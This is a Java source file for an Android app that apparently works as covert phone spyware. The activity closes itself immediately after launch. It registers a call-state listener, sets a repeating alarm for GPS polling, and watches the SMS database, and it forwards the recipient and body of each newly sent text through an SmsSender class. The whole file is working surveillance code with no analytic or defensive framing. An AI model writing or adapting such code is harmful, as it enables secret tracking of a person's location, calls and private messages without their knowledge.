package mb.android.cps;

import mb.android.cps.common.SharedValues;
import mb.android.cps.receivers.AlarmReceiver;
import mb.android.cps.receivers.MyPhoneStateListener;
import mb.android.cps.util.CurDevInfo;
import mb.android.cps.util.SmsSender;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.PhoneStateListener;

public class CPS extends Activity {
	private Handler handler;
	private MyContentObserver contentObserver;
	private Cursor cursor;
	private int recordsCount = 0;

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		SharedValues.curDevInfo = new CurDevInfo(getApplicationContext());

		SharedValues.curDevInfo.getTeleMgr().listen(new MyPhoneStateListener(),
				PhoneStateListener.LISTEN_CALL_STATE);

		setAlarmAndFinishThis();

		toMonitorSmsSent();

	}
	
	private void setAlarmAndFinishThis() {
			Intent alarmReceiverIntent = new Intent(CPS.this,
					AlarmReceiver.class);

			PendingIntent pendingIntent = PendingIntent.getBroadcast(CPS.this,
					0, alarmReceiverIntent, 0);

			AlarmManager alarmMgr = (AlarmManager) getSystemService(ALARM_SERVICE);

			alarmMgr.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0,
					SharedValues.GPS_DATA_POLLING_INTERVAL_IN_MIN * 60 * 1000,
					pendingIntent);

			finish();		
	}

	private void toMonitorSmsSent() {
		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
			}
		};

		contentObserver = new MyContentObserver(handler);

		// Uri uri = Uri.parse("content://sms/sent");
		Uri uri = Uri.parse("content://mms-sms/threadID?recipient");

		getContentResolver()
				.registerContentObserver(uri, true, contentObserver);
		getContentResolver().notifyChange(uri, contentObserver);
	}

	class MyContentObserver extends ContentObserver {

		public MyContentObserver(Handler handler) {
			super(handler);
		}

		@Override
		public void onChange(boolean selfChange) {
			super.onChange(selfChange);

			SharedValues.msgListenerCount++;

			// Log.i("CPS", "Notification on SMS observer: "
			// + SharedValues.msgListenerCount);

			if (SharedValues.msgListenerCount == 3) {
				SharedValues.msgListenerCount = 0;
				// Log.i("CPS", "messge sent");
				sendSentSmsDetails();
			}
		}

	}

	private void sendSentSmsDetails() {
		cursor = getContentResolver().query(Uri.parse("content://sms/sent"),
				null, null, null, null);

		recordsCount = cursor.getCount();

		if ((cursor != null) && (recordsCount != 0)) {
			try {
				cursor.moveToFirst();

				// Column count : 16
				// 0 : _id : 5
				// 1 : thread_id : 2
				// 2 : address : 4254
				// 3 : person : null
				// 4 : date : 1296546825054
				// 5 : protocol : null
				// 6 : read : 1
				// 7 : status : -1
				// 8 : type : 2
				// 9 : reply_path_present : null
				// 10 : subject : null
				// 11 : body : 5
				// 12 : service_center : null
				// 13 : locked : 0
				// 14 : error_code : 0
				// 15 : seen : 1

				new SmsSender(SharedValues.OG_MSG, cursor.getString(2), cursor
						.getString(11)).start();

			} finally {
				cursor.close();
			}
		}
	}

	@Override
	public void onBackPressed() {
		super.onBackPressed();
		finish();
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

}